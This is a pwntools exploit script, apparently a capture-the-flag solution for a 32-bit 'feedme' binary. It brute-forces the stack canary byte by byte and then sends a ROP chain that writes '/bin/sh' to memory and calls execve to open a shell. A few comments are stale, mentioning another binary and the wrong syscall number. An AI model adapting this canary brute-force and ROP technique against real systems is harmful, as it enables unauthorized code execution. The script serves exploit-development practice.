#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template feedme
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'feedme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x080490c9
bp 0x0804909d
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# brute force stack canary
first_padding = b"a" * 0x20
canary = b"\x00"
## first byte is always 0
## brute force: maximum 256*3 times
for i in range(0x22, 0x24+1):
    for bf in range(256):
        io.sendafter(b"FEED ME!", i.to_bytes())
        payload = first_padding + canary + bf.to_bytes()
        io.send(payload)
        recv = io.recvline()
        recv = io.recvline()
        recv = io.recvline()
        if b'*** stack smashing detected ***' not in recv:
            canary += bf.to_bytes()
            break
        
print(f"DEBUG: canary is {canary}")

payload = first_padding + canary
second_padding = b"a" * (0x30 - len(payload))
payload += second_padding
        
popeax = ROP(exe).find_gadget(["pop eax", "ret"])[0] # available
popebx = ROP(exe).find_gadget(["pop ebx", "ret"])[0] # available
# popecx = ROP(exe).find_gadget(["pop ecx", "ret"])[0] # not available
# manual gadget find:  ROPgadget --binary ./feedme | grep "ret" | grep ": pop ecx"
pop_ecx_pop_ebx = ROP(exe).find_gadget(["pop ecx", "pop ebx", "ret"])[0]
popedx = ROP(exe).find_gadget(["pop edx", "ret"])[0] # available
syscall = ROP(exe).find_gadget(["int 0x80"])[0] # available

# -----------------------------
# write string "/bin/sh\0" to
# a random space with w permission and full 0 bytes
# middle of heap
# pwndbg> x/2xw 0x80ec000
# 0x80ec000:      0x00000000      0x00000000

# ROPgadget --binary ./simplecalc | grep "ret" | grep ": mov dword ptr"
# 0x0807be31 : mov dword ptr [eax], edx ; ret
mov = 0x0807be31
binsh = 0x80ec000

# eax = binsh addr
payload += p32(popeax)
payload += p32(binsh)
# edx = "/bin"
payload += p32(popedx)
payload += b"/bin"
# mov dword ptr [eax], edx ; ret
payload += p32(mov)

# eax = binsh addr + 4
payload += p32(popeax)
payload += p32(binsh + 4)
# edx = "//sh"
payload += p32(popedx)
payload += b"//sh"
# mov dword ptr [eax], edx ; ret
payload += p32(mov)

# ------------END--------------

#-------ROP TO SYSCALL---------

# syscall sys_execve
# eax: 0xb
# ebx: address of command
# ecx: 0
# edx: 0

#-------------BEGIN------------
# eax = 59
payload += p32(popeax)
payload += p32(0xb)
# ecx = 0
# ebx = binsh
payload += p32(pop_ecx_pop_ebx)
payload += p32(0)
payload += p32(binsh)
# edx = 0
payload += p32(popedx)
payload += p32(0)
# syscall
payload += p32(syscall)
#-------------END--------------

io.sendafter(b"FEED ME!", len(payload).to_bytes())
io.send(payload)

io.interactive()

